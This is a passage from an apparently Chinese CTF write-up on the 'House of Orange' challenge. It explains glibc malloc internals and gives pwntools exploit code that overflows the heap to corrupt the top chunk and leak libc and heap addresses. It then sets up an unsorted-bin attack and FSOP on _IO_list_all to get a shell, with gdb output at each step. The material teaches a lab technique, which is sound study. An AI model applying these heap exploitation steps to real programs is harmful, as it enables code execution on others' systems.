sorted order */</span></span><br><span class="line">     <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">         size |= PREV_INUSE;</span><br><span class="line">         <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">         assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">         <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">             &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">           &#123;</span><br><span class="line">             fwd = bck;</span><br><span class="line">             bck = bck-&gt;bk;</span><br><span class="line">             victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">             victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">             fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p><code>malloc</code>源码中还把<code>old_top</code>的堆地址放到了堆里面，所以如果再次分配时候如果分配大小为<code>largebin</code>(也就是大于512字节)的<code>chunk</code>的话，就是可以既泄露<code>libc</code>又可以泄露<code>heap</code>。</p>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;@          House of Orange          @&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Build the house                  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. See the house                    &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Upgrade the house                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Give up                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice : &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>主要四个核心功能，重点在 build 和upgrade</p>
<ul>
<li><p>build</p>
<p>程序逻辑还比较清晰的，一共可以<code>build</code>四次，然后每次<code>build</code>的话就是3次堆分配，两次<code>malloc</code>，一次<code>calloc</code>，其中一次<code>malloc</code>是固定分配<code>0x10</code>字节作为控制堆块，里面存放着<code>name</code>和<code>color</code>的信息，另外按输入分配<code>name</code>的大小。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-31577117eac8c1f7b307fac7d526993a-51f0a9.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-31577117eac8c1f7b307fac7d526993a-51f0a9.png" alt="img"></a></p>
</li>
<li><p>upgrade</p>
</li>
</ul>
<p>在<code>upgrade</code>函数中，修改<code>name</code>时候不顾实际<code>chunk</code>的堆大小是多少，直接进行编辑，最大可编辑<code>0x1000</code>大小，因而存在溢出。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-524f4d9b37762df53ce512d909d094bb-e657f3.png" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-28-524f4d9b37762df53ce512d909d094bb-e657f3.png" alt="img"></a></p>
<p>由于没有 free ，所以这里我们采用上述原理的方法进行 free chunk to unsorte bin</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="overwrite-the-top-chunk"><a href="#overwrite-the-top-chunk" class="headerlink" title="overwrite the top chunk"></a>overwrite the top chunk</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>, <span class="number">0x90</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;c&#x27;</span> * <span class="number">0x90</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>) + p32(<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0xf21</span>)</span><br></pre></td></tr></table></figure>



<p>通过 堆溢出漏洞覆盖 top chunk，并构造好top chunk 的size 和 flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x5555557580e0 (size : 0xf20)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">gdb-peda$ x/20gx 0x5555557580e0</span><br><span class="line">0x5555557580e0:	0x0000000000000000	0x0000000000000f21</span><br><span class="line">0x5555557580f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>此时，构造 to chunk size 为 0xf21，满足条件，当申请大于 0xf21 size 的chunk 的时候，即可发生 free</p>
<h4 id="trigger-int-free"><a href="#trigger-int-free" class="headerlink" title="trigger _int_free()"></a>trigger _int_free()</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upgrade(pay, <span class="built_in">len</span>(pay), <span class="number">1</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>执行payload 后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55555577a010 (size : 0x20ff0)</span><br><span class="line">       last_remainder: 0x555555758120 (size : 0xec0)</span><br><span class="line">            unsortbin: 0x555555758120 (size : 0xec0)</span><br><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x555555758000      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758020      0x0                 0xa0                 Used                None              None</span><br><span class="line">0x5555557580c0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x5555557580e0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758100      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758120      0x0                 0xec0                Freed     0x2aaaab097b78    0x2aaaab097b78</span><br></pre></td></tr></table></figure>

<p>此时 old top chunk 被放到了 unsortbin 里，此时我们也有了 main_arean 地址。</p>
<h4 id="build-a-large-chunk-and-info-leak"><a href="#build-a-large-chunk-and-info-leak" class="headerlink" title="build a large chunk and info leak"></a>build a large chunk and info leak</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = myu64(io.recvn(<span class="number">6</span>)) &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + <span class="built_in">hex</span>(libc_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3bd000</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + <span class="built_in">hex</span>(libc.address) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap with fd_nextsize, bk_nextsize</span></span><br><span class="line">upgrade(<span class="string">&#x27;2&#x27;</span> * <span class="number">0x10</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;2&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = myu64(io.recvn(<span class="number">6</span>)) - <span class="number">0x140</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + <span class="built_in">hex</span>(heap_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>当build 2 一个large bin 的时候 即 大于 512 字节的 chunk，为发生原理写的那个trick 得到heap地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x555555758000      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758020      0x0                 0xa0                 Used                None              None</span><br><span class="line">0x5555557580c0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x5555557580e0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758100      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758120      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758140      0x0                 0x410                Used                None              None</span><br><span class="line">0x555555758550      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758570      0x0                 0xa70                Freed     0x2aaaab097b78    0x2aaaab097b78</span><br><span class="line">0x555555758fe0      0xa70               0x10                 Used                None              None</span><br><span class="line">0x555555758ff0      0x0                 0x10                 Freed                0x0               0x0</span><br><span class="line">Corrupt ?! (size == 0) (0x555555759000)</span><br><span class="line">gdb-peda$ mergeinfo 0x555555758140</span><br><span class="line">==================================</span><br><span class="line">            Merge info</span><br><span class="line">==================================</span><br><span class="line">The chunk will not merge with other</span><br><span class="line">gdb-peda$ x/20gx 0x555555758140</span><br><span class="line">0x555555758140:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x555555758150:	0x00002aaaab090a32	0x00002aaaab098188</span><br><span class="line">0x555555758160:	0x0000555555758140	0x0000555555758140</span><br></pre></td></tr></table></figure>



<p>此时，我们也能得到了 libc 地址和heap地址。</p>
<h4 id="File-Stream-Oriented-Programming（FSOP）"><a href="#File-Stream-Oriented-Programming（FSOP）" class="headerlink" title="File Stream Oriented Programming（FSOP）"></a>File Stream Oriented Programming（FSOP）</h4><p>紧接着，我们面临的另外一个问题就是如何控制程序流程。</p>
<p>我们知道，出现内存错误的时候一般会调用<code>malloc_printerr</code>，就像下面这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3547              if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))</span><br><span class="line">3548                malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);</span><br></pre></td></tr></table></figure>

<p>接着跟进一下，发现调用了<code>__libc_message</code>，并且<code>action=do_abort</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">5285    malloc_printerr (const char *str)</span><br><span class="line">5286    &#123;</span><br><span class="line">5287      __libc_message (do_abort, &quot;%s\n&quot;, str);</span><br><span class="line">5288      __builtin_unreachable ();</span><br><span class="line">5289    &#125;</span><br></pre></td></tr></table></figure>

<p>接着就是调用<code>abort</code>了：<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/libc_fatal.c.html#175">链接</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">175   if ((action &amp; do_abort))</span><br><span class="line">176     &#123;</span><br><span class="line">177       if ((action &amp; do_backtrace))</span><br><span class="line">178         BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line">179 </span><br><span class="line">180       &#x2F;* Kill the application.  *&#x2F;</span><br><span class="line">181       abort ();</span><br><span class="line">182     &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着就会调用<code>fflush</code>：<a href="https://code.woboq.org/userspace/glibc/stdlib/abort.c.html#abort">链接</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">70    &#x2F;* Flush all streams.  We cannot close them now because the user</span><br><span class="line">71       might have registered a handler for SIGABRT.  *&#x2F;</span><br><span class="line">72    if (stage &#x3D;&#x3D; 1)</span><br><span class="line">73      &#123;</span><br><span class="line">74        ++stage;</span><br><span class="line">75        fflush (NULL);</span><br><span class="line">76      &#125;</span><br></pre></td></tr></table></figure>

<p>而<code>fflush</code>对应着下面这个函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5   #define fflush(s) _IO_flush_all_lockp (0)</span><br></pre></td></tr></table></figure>

<p>这就是关键了：<a href="https://code.woboq.org/userspace/glibc/libio/genops.c.html#_IO_flush_all_lockp">链接</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)<span class="comment">// 汇编abort + 248调用</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);<span class="comment">// 需要覆盖的地方</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">// 需要篡改为system的函数 汇编b *_IO_flush_all_lockp+356</span></span><br><span class="line">        result = EOF;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20190305040412416](/Users/swing/Library/Application Support/typora-user-images/image-20190305040412416.png)</p>
<p>如果我们能伪造上述的file struck ，那么就能get shell，伪造的前提，我们得能控制 _IO_list_all .此时我们在unsorted bin 和 堆溢出的条件下，是能利用 unsortbin attack ，向 _IO_list_all 写入一个指针。</p>
<p><code>unsortbin attack</code>是怎么一回事呢，其实就是在<code>malloc</code>的过程中，<code>unsortbin</code>会从链表上卸下来（只要分配的大小不是<code>fastchunk</code>大小） </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>如上代码所示，就是会把<code>bk+0x10</code>的地方写入本unsort_bin的地址， </p>
<p>当 fake 了 unsoted bin 的 bk的时候，再一次malloc 时候，在_ini_malloc 即可完成 unsortbin attack。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x7fffffffe59f --&gt; 0xa00 (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">RBX: 0x2aaaab097b20 --&gt; 0x100000001</span><br><span class="line">RCX: 0x7c (<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">RDX: 0x2aaaab097b28 --&gt; 0x0</span><br><span class="line">RSI: 0x60 (<span class="string">&#x27;`&#x27;</span>)</span><br><span class="line">RDI: 0x7fffffffe5a0 --&gt; 0xa (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">RBP: 0x20 (<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">RSP: 0x7fffffffe520 --&gt; 0x2</span><br><span class="line">RIP: 0x2aaaaad54e10 (&lt;_int_malloc+656&gt;:	mov    QWORD PTR [r15+0x10],r12)</span><br><span class="line">R8 : 0x0</span><br><span class="line">R9 : 0x1999999999999999</span><br><span class="line">R10: 0x0</span><br><span class="line">R11: 0x2aaaaae4a5e0 --&gt; 0x2000200020002</span><br><span class="line">R12: 0x2aaaab097b78 --&gt; 0x55555577a010 --&gt; 0x0</span><br><span class="line">R13: 0x555555758570 --&gt; 0x68732f6e69622f (<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">R14: 0x2710</span><br><span class="line">R15: 0x2aaaab098510 --&gt; 0x0</span><br><span class="line">EFLAGS: 0x287 (CARRY PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x2aaaaad54e03 &lt;_int_malloc+643&gt;:	je     0x2aaaaad54fa0 &lt;_int_malloc+1056&gt;</span><br><span class="line">   0x2aaaaad54e09 &lt;_int_malloc+649&gt;:	cmp    rbp,rsi</span><br><span class="line">   0x2aaaaad54e0c &lt;_int_malloc+652&gt;:	mov    QWORD PTR [rbx+0x70],r15</span><br><span class="line">=&gt; 0x2aaaaad54e10 &lt;_int_malloc+656&gt;:	mov    QWORD PTR [r15+0x10],r12</span><br><span class="line">   0x2aaaaad54e14 &lt;_int_malloc+660&gt;:	je     0x2aaaaad552c8 &lt;_int_malloc+1864&gt;</span><br><span class="line">   0x2aaaaad54e1a &lt;_int_malloc+666&gt;:	cmp    rsi,0x3ff</span><br><span class="line">   0x2aaaaad54e21 &lt;_int_malloc+673&gt;:	jbe    0x2aaaaad54d80 &lt;_int_malloc+512&gt;</span><br><span class="line">   0x2aaaaad54e27 &lt;_int_malloc+679&gt;:	mov    rax,rsi</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffe520 --&gt; 0x2</span><br><span class="line">0008| 0x7fffffffe528 --&gt; 0x10</span><br><span class="line">0016| 0x7fffffffe530 --&gt; 0x7fffffffe5a0 --&gt; 0xa (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">0024| 0x7fffffffe538 --&gt; 0x7fffffffe740 --&gt; 0x1</span><br><span class="line">0032| 0x7fffffffe540 --&gt; 0x0</span><br><span class="line">0040| 0x7fffffffe548 --&gt; 0x0</span><br><span class="line">0048| 0x7fffffffe550 --&gt; 0xffff800000001a61</span><br><span class="line">0056| 0x7fffffffe558 --&gt; 0x7fffffffe59f --&gt; 0xa00 (<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">3516	<span class="keyword">in</span> malloc.c</span><br><span class="line">1: _IO_list_all = (struct _IO_FILE_plus *) 0x2aaaab098540 &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure>



<p>此时，<code>mov    QWORD PTR [r15+0x10],r12</code></p>
<p><code>R12: 0x2aaaab097b78 --&gt; 0x55555577a010 --&gt; 0x0</code> ,<code>R15: 0x2aaaab098510 --&gt; 0x0</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p _IO_list_all</span><br><span class="line"><span class="variable">$11</span> = (struct _IO_FILE_plus *) 0x2aaaab097b78 &lt;main_arena+88&gt;</span><br></pre></td></tr></table></figure>

<p> _IO_list_all 被 修改成 0x2aaaab097b78 addr 。</p>
<p>此时 _IO_list_all —&gt; main_arean 。另外一个问题来了，我们虽然控制了 _IO_list_all ,但是无法修改main_arean 的值。</p>
<p>我们注意到，此时 main_arean 被当做 file struct ，则应有如下结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span>  </span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags  </span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  </span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span>  </span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span>  </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>  </span><br><span class="line">  <span class="keyword">int</span> 